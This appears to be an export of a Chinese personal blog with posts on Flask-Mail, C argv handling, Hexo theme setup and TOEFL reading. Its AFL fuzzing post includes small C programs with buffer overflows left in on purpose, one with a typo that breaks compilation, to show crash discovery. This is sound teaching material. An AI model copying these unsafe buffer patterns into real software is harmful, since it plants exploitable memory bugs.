<td><strong>MAIL_DEBUG</strong>调试支持。默认值是Flask应用程序的调试状态</td>
</tr>
<tr>
<td>6</td>
<td><strong>MAIL_USERNAME</strong>发件人的用户名</td>
</tr>
<tr>
<td>7</td>
<td><strong>MAIL_PASSWORD</strong>发件人的密码</td>
</tr>
<tr>
<td>8</td>
<td><strong>MAIL_DEFAULT_SENDER</strong>设置默认发件人</td>
</tr>
<tr>
<td>9</td>
<td><strong>MAIL_MAX_EMAILS</strong>设置要发送的最大邮件数</td>
</tr>
<tr>
<td>10</td>
<td><strong>MAIL_SUPPRESS_SEND</strong>如果app.testing设置为true，则发送被抑制</td>
</tr>
<tr>
<td>11</td>
<td><strong>MAIL_ASCII_ATTACHMENTS</strong>如果设置为true，则附加的文件名将转换为ASCII</td>
</tr>
</tbody></table>
<p>flask-mail模块包含以下重要类的定义。</p>
<h3 id="Mail类"><a href="#Mail类" class="headerlink" title="Mail类"></a>Mail类</h3><p>它管理电子邮件消息传递需求。类构造函数采用以下形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask-mail.Mail(app &#x3D; None)</span><br></pre></td></tr></table></figure>

<p>构造函数将Flask应用程序对象作为参数。</p>
<h3 id="Mail类的方法"><a href="#Mail类的方法" class="headerlink" title="Mail类的方法"></a>Mail类的方法</h3><table>
<thead>
<tr>
<th>序号</th>
<th>方法与描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>send()</strong>发送Message类对象的内容</td>
</tr>
<tr>
<td>2</td>
<td><strong>connect()</strong>打开与邮件主机的连接</td>
</tr>
<tr>
<td>3</td>
<td><strong>send_message()</strong>发送消息对象</td>
</tr>
</tbody></table>
<h3 id="Message类"><a href="#Message类" class="headerlink" title="Message类"></a>Message类</h3><p>它封装了一封电子邮件。Message类构造函数有几个参数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask-mail.Message(subject, recipients, body, html, sender, cc, bcc, </span><br><span class="line">   reply-to, date, charset, extra_headers, mail_options, rcpt_options)</span><br></pre></td></tr></table></figure>

<h3 id="Message类方法"><a href="#Message类方法" class="headerlink" title="Message类方法"></a>Message类方法</h3><p><strong>attach()</strong> - 为邮件添加附件。此方法采用以下参数：</p>
<ul>
<li><strong>filename</strong> - 要附加的文件的名称</li>
<li><strong>content_type</strong> - MIME类型的文件</li>
<li><strong>data</strong> - 原始文件数据</li>
<li><strong>处置</strong> - 内容处置（如果有的话）。</li>
</ul>
<p><strong>add_recipient()</strong> - 向邮件添加另一个收件人</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment"># 步骤一:在代码中从flask-mail模块导入Mail和Message类。</span></span><br><span class="line"><span class="keyword">from</span> flask_mail <span class="keyword">import</span> Mail, Message </span><br><span class="line"></span><br><span class="line">app =Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤二：然后按照以下设置配置Flask-Mail</span></span><br><span class="line">app.config[<span class="string">'MAIL_SERVER'</span>]=<span class="string">'smtp.gmail.com'</span></span><br><span class="line">app.config[<span class="string">'MAIL_PORT'</span>] = <span class="number">465</span></span><br><span class="line">app.config[<span class="string">'MAIL_USERNAME'</span>] = <span class="string">'yourId@gmail.com'</span></span><br><span class="line">app.config[<span class="string">'MAIL_PASSWORD'</span>] = <span class="string">'*****'</span> <span class="comment"># 发件放邮箱需要开启POP3/SMTP服务，获取客户端授权码，填入app.config['MAIL_PASSWORD']</span></span><br><span class="line">app.config[<span class="string">'MAIL_USE_TLS'</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">'MAIL_USE_SSL'</span>] = <span class="literal">True</span></span><br><span class="line"><span class="comment"># 步骤三：创建Mail类的实例</span></span><br><span class="line">mail = Mail(app)</span><br><span class="line"><span class="comment"># 步骤四：在由URL规则（‘/’）映射的Python函数中设置Message对象。</span></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   msg = Message(<span class="string">'Hello'</span>, sender = <span class="string">'yourId@gmail.com'</span>, recipients = [<span class="string">'id1@gmail.com'</span>])</span><br><span class="line">   msg.body = <span class="string">"Hello Flask message sent from Flask-Mail"</span></span><br><span class="line">   mail.send(msg)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"Sent"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>在发送至163邮箱时出现了被当成垃圾邮件被拒收的情况（TAT），发送到qq邮箱是可以的</p>
]]></content>
      <categories>
        <category>Flask</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言参数学习</title>
    <url>/2020/04/13/c%E8%AF%AD%E8%A8%80%E5%8F%82%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;%s\n&quot;,argv[0]);&#x2F;&#x2F;读取可执行程序（包括路径）</span><br><span class="line"></span><br><span class="line">        &#x2F;*读取参数*&#x2F;</span><br><span class="line">        int i &#x3D; 1;</span><br><span class="line">        while(i &lt; argc)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;%s\n&quot;,argv[i]);</span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;说明在dos和unix环境下,用&quot;&quot;扩起来的表示其是一个字符串，代表着一个参数</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>编译器默认只输入一个参数，即</p>
<ul>
<li>argc=1</li>
<li>argv[0]=.exe文件路径</li>
</ul>
</li>
<li><p>使用cmd输入多个参数</p>
</li>
</ul>
<p>输入exe文件，参数间用空格隔开</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/c%E8%AF%AD%E8%A8%80%E5%8F%82%E6%95%B0%E5%AD%A6%E4%B9%A0.assets/20160721233522377.jfif"  alt="img"></p>
<blockquote>
<p>参考</p>
<ul>
<li><p><a href="https://www.cnblogs.com/yanglai/p/6927151.html" target="_blank" rel="noopener">https://www.cnblogs.com/yanglai/p/6927151.html</a></p>
</li>
<li><p><a href="https://blog.csdn.net/dcrmg/article/details/51987413" target="_blank" rel="noopener">https://blog.csdn.net/dcrmg/article/details/51987413</a></p>
</li>
</ul>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>AFL工作过程分析</title>
    <url>/2020/04/13/AFL%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CC&#x3D;afl-clang；export CXX&#x3D;afl-clang++；</span><br><span class="line"></span><br><span class="line">test.c为待测程序代码</span><br><span class="line">afl-gcc -g -o afl_test afl_test.c</span><br><span class="line"></span><br><span class="line">对那些可以直接从stdin读取输入的目标程序来说，语法如下：</span><br><span class="line">.&#x2F;afl-fuzz -i testcase_dir -o findings_dir &#x2F;path&#x2F;to&#x2F;program […params…]</span><br><span class="line">对从文件读取输入的目标程序来说，要用“@@”，语法如下：</span><br><span class="line">.&#x2F;afl-fuzz -i testcase_dir -o findings_dir &#x2F;path&#x2F;to&#x2F;program @@</span><br></pre></td></tr></table></figure>

<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;               </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span> <span class="params">(<span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">'a'</span>) n++;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">1</span>] == <span class="string">'f'</span>) n++;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">2</span>] == <span class="string">'l'</span>) n++;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">3</span>] == <span class="string">'!'</span>) n++;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"awesome!\n"</span>);</span><br><span class="line">        raise(SIGSEGV); <span class="comment">//异常退出</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    fp = fopen(argv[<span class="number">1</span>],<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    fgets(buf,<span class="number">1024</span>,fp); <span class="comment">//溢出？</span></span><br><span class="line">    test(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在输入文件夹（这里是fuzz_in)建立testcase文件，内容位任一可以使程序正常运行的输入</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/AFL工作过程分析.assets/image-20200420151036755.png"  alt="image-20200420151036755" style="zoom:67%;">




<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o .&#x2F;test .&#x2F;test.c</span><br><span class="line">afl-fuzz -i fuzz_in -o fuzz_out .&#x2F;test @@</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用afl-clang：</p>
<p>分析出了1个uniq crashes</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/AFL工作过程分析.assets/image-20200414110445763.png"  alt="image-20200414110445763" style="zoom:50%;">



<ul>
<li><p>使用afl-gcc</p>
<p>分析出了4个uniq crashes</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/AFL工作过程分析.assets/image-20200414110516948.png"  alt="image-20200414110516948" style="zoom:50%;">





<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void why_here(void)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;why r u here?\n&quot;);</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void f()</span><br><span class="line">&#123;</span><br><span class="line">	char buff[2];</span><br><span class="line">	buff[2]&#x3D;(int)why_here;</span><br><span class="line">	reutrn;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	f();</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>AFL</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo butterfly主题配置补充</title>
    <url>/2020/04/13/hexo-butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>详细配置内容请参考<a href="https://jerryc.me/tags/butterfly/" target="_blank" rel="noopener">官方配置文档</a></p>
<p>本文仅对个人在配置中遇到的问题进行记录</p>
</blockquote>
<hr>
<h1 id="hexo-tag-aplayer"><a href="#hexo-tag-aplayer" class="headerlink" title="hexo-tag-aplayer"></a>hexo-tag-aplayer</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-aplayer</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page music</span><br></pre></td></tr></table></figure>

<h3 id="Meting"><a href="#Meting" class="headerlink" title="Meting"></a>Meting</h3><ol>
<li>在hexo/_config.yml中添加代码</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aplayer:</span></span><br><span class="line"> <span class="attr">meting:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>设置hexo/_config.yml中的external_link</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># Apply to the whole site,设置为post</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>

<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% meting &quot;id&quot; &quot;server&quot; &quot;type&quot; %&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">默认值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">id</td>
<td align="left"><strong>必须值</strong></td>
<td align="left">歌曲 id / 播放列表 id / 相册 id / 搜索关键字</td>
</tr>
<tr>
<td align="left">server</td>
<td align="left"><strong>必须值</strong></td>
<td align="left">音乐平台: <code>netease</code>, <code>tencent</code>, <code>kugou</code>, <code>xiami</code>, <code>baidu</code></td>
</tr>
<tr>
<td align="left">type</td>
<td align="left"><strong>必须值</strong></td>
<td align="left"><code>song</code>, <code>playlist</code>, <code>album</code>, <code>search</code>, <code>artist</code></td>
</tr>
<tr>
<td align="left">fixed</td>
<td align="left"><code>false</code></td>
<td align="left">开启固定模式</td>
</tr>
<tr>
<td align="left">mini</td>
<td align="left"><code>false</code></td>
<td align="left">开启迷你模式</td>
</tr>
<tr>
<td align="left">loop</td>
<td align="left"><code>all</code></td>
<td align="left">列表循环模式：<code>all</code>, <code>one</code>,<code>none</code></td>
</tr>
<tr>
<td align="left">order</td>
<td align="left"><code>list</code></td>
<td align="left">列表播放模式： <code>list</code>, <code>random</code></td>
</tr>
<tr>
<td align="left">volume</td>
<td align="left">0.7</td>
<td align="left">播放器音量</td>
</tr>
<tr>
<td align="left">lrctype</td>
<td align="left">0</td>
<td align="left">歌词格式类型</td>
</tr>
<tr>
<td align="left">listfolded</td>
<td align="left"><code>false</code></td>
<td align="left">指定音乐播放列表是否折叠</td>
</tr>
<tr>
<td align="left">storagename</td>
<td align="left"><code>metingjs</code></td>
<td align="left">LocalStorage 中存储播放器设定的键名</td>
</tr>
<tr>
<td align="left">autoplay</td>
<td align="left"><code>true</code></td>
<td align="left">自动播放，移动端浏览器暂时不支持此功能</td>
</tr>
<tr>
<td align="left">mutex</td>
<td align="left"><code>true</code></td>
<td align="left">该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td>
</tr>
<tr>
<td align="left">listmaxheight</td>
<td align="left"><code>340px</code></td>
<td align="left">播放列表的最大长度</td>
</tr>
<tr>
<td align="left">preload</td>
<td align="left"><code>auto</code></td>
<td align="left">音乐文件预载入模式，可选项： <code>none</code>, <code>metadata</code>, <code>auto</code></td>
</tr>
<tr>
<td align="left">theme</td>
<td align="left"><code>#ad7a86</code></td>
<td align="left">播放器风格色彩设置</td>
</tr>
</tbody></table>
<h3 id="样例："><a href="#样例：" class="headerlink" title="样例："></a>样例：</h3><p>添加至index.md </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 南开大学闭馆音乐</span><br><span class="line"></span><br><span class="line">&#123;% meting &quot;2999255636&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#FF4081&quot; &quot;mode:circulation&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p>同时也可以添加至其它页面中</p>
<blockquote>
<p>#南开大学闭馆音乐</p>

    <div id="aplayer-jCBqCZgX" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="2999255636" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#FF4081"></div>
</blockquote>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://dsanying.coding.me/HEXO%E6%8F%92%E4%BB%B6-hexo-tag-dplayer/" target="_blank" rel="noopener">https://dsanying.coding.me/HEXO%E6%8F%92%E4%BB%B6-hexo-tag-dplayer/</a></li>
<li><a href="https://github.com/MoePlayer/hexo-tag-aplayer" target="_blank" rel="noopener">https://github.com/MoePlayer/hexo-tag-aplayer</a></li>
<li><a href="https://www.jianshu.com/p/f1005ae09e5a" target="_blank" rel="noopener">https://www.jianshu.com/p/f1005ae09e5a</a></li>
</ul>
</blockquote>
<hr>
<h1 id="hexo-douban"><a href="#hexo-douban" class="headerlink" title="hexo-douban"></a>hexo-douban</h1><h2 id="安装模块依赖"><a href="#安装模块依赖" class="headerlink" title="安装模块依赖"></a>安装模块依赖</h2><p>我们使用时可以先安装依赖模块，在<code>GitBash</code>中使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-douban --save</span><br></pre></td></tr></table></figure>

<h3 id="站点配置文件中添加配置"><a href="#站点配置文件中添加配置" class="headerlink" title="站点配置文件中添加配置"></a>站点配置文件中添加配置</h3><p>然后我们再在Hexo站点根目录配置文件<code>_config.xml</code>中的末尾添加如下配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">douban:</span><br><span class="line">  user: mythsman</span><br><span class="line">  builtin: false</span><br><span class="line">  book:</span><br><span class="line">    title: &#39;This is my book title&#39;</span><br><span class="line">    quote: &#39;This is my book quote&#39;</span><br><span class="line">  movie:</span><br><span class="line">    title: &#39;This is my movie title&#39;</span><br><span class="line">    quote: &#39;This is my movie quote&#39;</span><br><span class="line">  game:</span><br><span class="line">    title: &#39;This is my game title&#39;</span><br><span class="line">    quote: &#39;This is my game quote&#39;</span><br><span class="line">  timeout: 10000</span><br></pre></td></tr></table></figure>

<p>上面参数说明：</p>
<ul>
<li><strong>user</strong>: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”<a href="https://www.douban.com/people/xxxxxx/“" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/“</a> ，其中的”xxxxxx”就是你的个人ID了。</li>
<li><strong>builtin</strong>: 是否将生成页面的功能嵌入<code>hexo s</code>和<code>hexo g</code>中，默认是<code>false</code>,另一可选项为<code>true</code>(1.x.x版本新增配置项)。</li>
<li><strong>title</strong>: 该页面的标题.</li>
<li><strong>quote</strong>: 写在页面开头的一段话,支持html语法.</li>
<li><strong>timeout</strong>: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</li>
</ul>
<p>由于<code>hexo-douban</code> 是默认抓取豆瓣读书、豆瓣电影以及豆瓣游戏的，如果只想要其中一部分，可以把其它部分在上述配置文件中去掉即可。</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>那么我们如何去使用这个呢？</p>
<p>我们只需要在<code>GitBash</code>中输入以下命令：<code>hexo clean &amp;&amp; hexo douban -bgm &amp;&amp; hexo g &amp;&amp; hexo s</code>即可，注意其中开启hexo-douban的命令中，<code>-bgm</code>代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。</p>
<p>另外注意的是，由于<code>hexo douban</code>的简写也是<code>hexo d</code>，与<code>hexo deploy</code>的简写指令<code>hexo d</code>冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>上面都没问题之后，我们只需要在站点目录下测试<code>http://localhost:4000/books</code>或者<code>http://localhost:4000/movies</code>等，如果看到页面了就说明成功了。</p>
<h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>在hexo/_config.yml中添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 豆瓣</span><br><span class="line">douban:</span><br><span class="line">  user: 215086406</span><br><span class="line">  builtin: true</span><br><span class="line">  movie:</span><br><span class="line">    title: &#39;This is my movie title&#39;</span><br><span class="line">    quote: &#39;This is my movie quote&#39;</span><br><span class="line">  book:</span><br><span class="line">    title: &#39;This is my book title&#39;</span><br><span class="line">    quote: &#39;This is my book quote&#39;</span><br><span class="line">  music:</span><br><span class="line">    title: &#39;This is my music title&#39;</span><br><span class="line">    quote: &#39;This is my music quote&#39;</span><br><span class="line">  photo:</span><br><span class="line">    title: &#39;This is my photo title&#39;</span><br><span class="line">    quote: &#39;This is my photo quote&#39;</span><br><span class="line">  timeout: 10000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://github.com/mythsman/hexo-douban" target="_blank" rel="noopener">https://github.com/mythsman/hexo-douban</a></li>
<li><a href="https://bestzuo.cn/posts/hexo-douban.html" target="_blank" rel="noopener">https://bestzuo.cn/posts/hexo-douban.html</a></li>
</ul>
</blockquote>
<h1 id="标签外挂"><a href="#标签外挂" class="headerlink" title="标签外挂"></a>标签外挂</h1><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% note default %&#125;</span><br><span class="line">default 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;</span><br><span class="line">primary 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success %&#125;</span><br><span class="line">success 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info %&#125;</span><br><span class="line">info 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning %&#125;</span><br><span class="line">warning 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger %&#125;</span><br><span class="line">danger 提示块标籤</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例"></a>样例</h2><div class="note default">
            <p>default 提示块标籤</p>
          </div>

<div class="note primary no-icon">
            <p>primary 提示块标籤</p>
          </div>

<div class="note success">
            <p>success 提示块标籤</p>
          </div>

<div class="note info">
            <p>info 提示块标籤</p>
          </div>

<div class="note warning">
            <p>warning 提示块标籤</p>
          </div>

<div class="note danger">
            <p>danger 提示块标籤</p>
          </div>

<hr>
<h1 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h1><h2 id="Page-Front-matter"><a href="#Page-Front-matter" class="headerlink" title="Page Front-matter"></a>Page Front-matter</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">type: (tags,link,categories这三个页面需要配置)</span><br><span class="line">comments: (是否需要显示评论，默认true)</span><br><span class="line">description:</span><br><span class="line">top_img: (设置顶部图)</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">aside:</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h2 id="Post-Front-matter"><a href="#Post-Front-matter" class="headerlink" title="Post Front-matter"></a>Post Front-matter</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img: (除非特定需要，可以不写)</span><br><span class="line">comments  是否显示评论(除非设置false,可以不写)</span><br><span class="line">cover:  缩略图</span><br><span class="line">toc:  是否显示toc (除非特定文章设置，可以不写)</span><br><span class="line">toc_number: 是否显示toc数字 (除非特定文章设置，可以不写)</span><br><span class="line">copyright: 是否显示版权 (除非特定文章设置，可以不写)</span><br><span class="line">mathjax:</span><br><span class="line">katex:</span><br><span class="line">hide: 是否隐藏文章</span><br><span class="line">top: 是否置顶</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>主题配置</tag>
      </tags>
  </entry>
  <entry>
    <title>托福阅读精读</title>
    <url>/2020/04/13/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E6%89%98%E7%A6%8F%E9%98%85%E8%AF%BB%E7%B2%BE%E8%AF%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="TPO46"><a href="#TPO46" class="headerlink" title="TPO46"></a>TPO46</h1><h2 id="The-Commercial-Revolution-in-Medieval-Europe"><a href="#The-Commercial-Revolution-in-Medieval-Europe" class="headerlink" title="The Commercial Revolution in Medieval Europe"></a>The Commercial Revolution in Medieval Europe</h2><p>中世纪欧洲商业革命</p>
<blockquote>
<p>社会学</p>
</blockquote>
<h3 id="Paragraph-1"><a href="#Paragraph-1" class="headerlink" title="Paragraph 1"></a>Paragraph 1</h3><p>Beginning in the 1160s, the opening of new silver mines in northern Europe led to the <code>minting(铸造)</code> and circulation of vast quantities of silver coins.<br>The widespread use of cash greatly increased the <code>volume(量)</code> of international trade.<br>Business procedures changed radically. The individual traveling merchant who alone handled <code>virtually(几乎，差不多)</code> all aspects of exchange evolved into an operation involving three separate types of merchants: the sedentary merchant who ran the “home office” financing and organizing the firm’s entire export-import trade; the carriers who transported goods by land and sea; and the company agents resident in cities abroad who, on the advice of the home office, looked after sales and <code>procurements(采购)</code>.</p>
<h3 id="Paragraph-2"><a href="#Paragraph-2" class="headerlink" title="Paragraph 2"></a>Paragraph 2</h3><p><code>Commercial correspondence(商业通信)</code>, unnecessary when one businessperson oversaw everything and made direct bargains with buyers and sellers, multiplied. </p>
<blockquote>
<p>commercial correspendence mutiplied. 商业通信被大量使用</p>
</blockquote>
<p>Regular <code>courier service(快递服务)</code> among commercial cities began. </p>
<p>Commercial accounting became more complex when firms had to deal with <code>shareholders(股东)</code>, manufacturers, customers, branch offices, employees, and competing firms. </p>
<p><code>Tolls on roads(公路收费)</code> became high enough to <code>finance(融资)</code> what has been called a road revolution, involving new <code>surfaces(路面)</code> and bridges, new <code>passes(隧道)</code> through the Alps, and new inns and <code>hospices(招待所)</code>  for travelers. </p>
<p>The growth of mutual trust among merchants facilitated the growth of sales <code>on credit(赊账)</code>  and led to new developments in finance, such as the <code>bill of exchange(汇票)</code> , a device that made the long, slow, and very dangerous shipment of coins unnecessary.</p>
<p>The <code>ventures(n.(尤指有风险的) 企业，商业，投机活动，经营项目;)</code> of the German Hanseatic League illustrate these advancements. The Hanseatic League was a mercantile association of European towns dating from 1159. </p>
<p>The league grew by the end of the fourteenth century to include about 200 cities from Holland to Poland.</p>
<p> Across regular, well- defined trade routes along the Baltic and North seas, the ships of league cities carried furs, wax, copper, fish, grain, timber, and wine. </p>
<p>These goods were exchanged for <code>finished products(成品)</code> , mainly cloth and salt, from western cities. </p>
<blockquote>
<p>raw marterial    原材料</p>
<p>semi-finished product    半成品</p>
<p>finished product    成品</p>
</blockquote>
<p>At cities such as Bruges and London, Hanseatic merchants secured special <code>trading concessions(贸易优惠)</code> , <code>exempting(免除)</code>  them from all tolls and allowing them to trade at local <code>fairs(集市)</code>. </p>
<blockquote>
<p>concession    n.让步; 妥协; 承认; 给予; 许可; 减价; (对某类人的) 减价票;</p>
<p>exempt    v.免除; 豁免;</p>
</blockquote>
